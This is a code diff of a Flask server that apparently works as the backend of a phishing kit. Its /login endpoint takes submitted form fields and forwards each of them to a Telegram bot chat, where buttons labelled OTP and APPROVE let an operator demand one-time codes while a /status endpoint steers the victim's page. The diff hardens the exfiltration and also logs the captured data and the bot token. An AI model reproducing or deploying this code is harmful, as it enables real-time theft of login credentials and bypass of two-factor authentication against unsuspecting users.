@@ -4,9 +4,6 @@ import os
 import uuid
 import requests
 import json
-from dotenv import load_dotenv
-
-load_dotenv()
 
 app = Flask(__name__)
 CORS(app)
@@ -18,33 +15,49 @@ def after_request(response):
     response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
     return response
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+# 🔥 GET ENV (Render compatible)
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
+
+print("BOT_TOKEN:", BOT_TOKEN)
+print("CHAT_ID:", CHAT_ID)
 
 SESSION_STATUS = {}
 
 # ================= TELEGRAM =================
 def send_to_telegram(data, session_id):
-    msg = "🔐 LOGIN\n\n"
-    for k, v in data.items():
-        msg += f"{k}: {v}\n"
-    msg += f"\nSESSION: {session_id}"
+    try:
+        print("📤 SENDING TELEGRAM...")
 
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
-            [{"text": "✅ APPROVE", "callback_data": f"{session_id}:approved"}]
-        ]
-    }
+        if not BOT_TOKEN or not CHAT_ID:
+            print("❌ BOT_TOKEN or CHAT_ID missing")
+            return
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        data={
-            "chat_id": CHAT_ID,
-            "text": msg,
-            "reply_markup": json.dumps(keyboard)
+        msg = "🔐 LOGIN\n\n"
+        for k, v in data.items():
+            msg += f"{k}: {v}\n"
+        msg += f"\nSESSION: {session_id}"
+
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
+                [{"text": "✅ APPROVE", "callback_data": f"{session_id}:approved"}]
+            ]
         }
-    )
+
+        r = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": CHAT_ID,
+                "text": msg,
+                "reply_markup": json.dumps(keyboard)
+            }
+        )
+
+        print("📨 TELEGRAM RESPONSE:", r.text)
+
+    except Exception as e:
+        print("❌ TELEGRAM ERROR:", e)
 
 # ================= LOGIN =================
 @app.route("/login", methods=["POST"])
@@ -54,7 +67,8 @@ def login():
     session_id = str(uuid.uuid4())
     SESSION_STATUS[session_id] = "pending"
 
-    print("NEW SESSION:", session_id)
+    print("🆕 NEW SESSION:", session_id)
+    print("📥 DATA:", data)
 
     send_to_telegram(data, session_id)
 
@@ -68,7 +82,7 @@ def login():
 def status(session_id):
     status = SESSION_STATUS.get(session_id)
 
-    print("STATUS CHECK:", session_id, status)
+    print("🔍 STATUS CHECK:", session_id, status)
 
     if not status:
         return jsonify({"status": "invalid"})
@@ -79,7 +93,7 @@ def status(session_id):
 @app.route("/webhook", methods=["POST"])
 def webhook():
     data = request.get_json()
-    print("WEBHOOK HIT:", data)
+    print("📩 WEBHOOK HIT:", data)
 
     try:
         if "callback_query" in data:
@@ -90,20 +104,15 @@ def webhook():
 
             print("👉 CLICK:", action)
 
-            # 🔥 HARD FORCE (NO BUG POSSIBLE)
             if action == "otp":
                 SESSION_STATUS[session_id] = "otp"
-
             elif action == "approved":
                 SESSION_STATUS[session_id] = "approved"
-
-            else:
-                SESSION_STATUS[session_id] = action
 
             print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])
 
     except Exception as e:
-        print("❌ ERROR:", e)
+        print("❌ WEBHOOK ERROR:", e)
 
     return jsonify({"ok": True})
 
